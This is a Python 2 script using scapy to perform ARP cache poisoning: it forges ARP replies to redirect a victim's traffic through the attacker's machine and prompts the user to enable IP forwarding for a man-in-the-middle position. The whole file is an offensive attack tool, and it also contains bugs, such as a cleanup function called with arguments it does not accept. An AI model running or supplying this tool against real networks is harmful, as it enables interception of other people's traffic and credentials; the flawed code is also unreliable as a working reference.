#!/usr/bin/python2.7

import os
import sys
import re

from time import sleep
from scapy.layers.inet import (
    ARP,
    Ether,
    ETHER_BROADCAST,
    send,
    srp
)

def get_mac(ip_1):
    print("[\033[32m+\033[00m] Getting mac address")
    arping = Ether(dst = ETHER_BROADCAST) / ARP(pdst = ip_1)
    os.write(1, "[\033[32m+\033[00m] ")
    rep, norep = srp(arping, timeout = 2)
    for snd, rcv in rep:
        return rcv.sprintf(r"%Ether.src%")

def arspoof(ip_1, ip_2, regex_mac):
    trame = ARP(op = 2, psrc = ip_1, pdst = ip_2, hwdst = get_mac(ip_1))
    trame.show()
    print("[\033[32m+\033[00m] Sending packets to " + ip_2)
    os.write(1, "[\033[32m+\033[00m] ")
    srp(trame)

def clean():
    trame = ARP(op = 2, pdst = ip_2, hwdst = get_mac(ip_1))
    print("[\033[32m+\033[00m] Cleaning target's cache")
    send(trame, count = 5)
    print ("[\033[32m+\033[00m] Quitting")

regex_ip = "([0-9]{1,3}\.){3}[0-9]{1,3}"
regex_mac = "([0-9a-f]{2}\:){5}[0-9a-f]{2}"

if (len(sys.argv) != 3 or sys.argv[1] == "-h"):
    print("USAGE:\n\t./arspoof.py <ip_target> <ip_victim>")
    exit(0)
if (re.match(regex_ip, sys.argv[1]) == None or re.match(regex_ip, sys.argv[2]) == None):
    os.write(2, "[\033[31m-\033[00m] Error: ip adress must match with the regular expression.\n")
    exit(84)
if (os.getuid() != 0):
    os.write(2, "[\033[31m-\033[00m] The script must be run as root.\n")
    exit(84)

ip_1 = sys.argv[1]
ip_2 = sys.argv[2]

print("[\033[33m!\033[00m] Dont forget to enable forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward")
arspoof(ip_1, ip_2, regex_mac)
clean(ip_1, ip_2)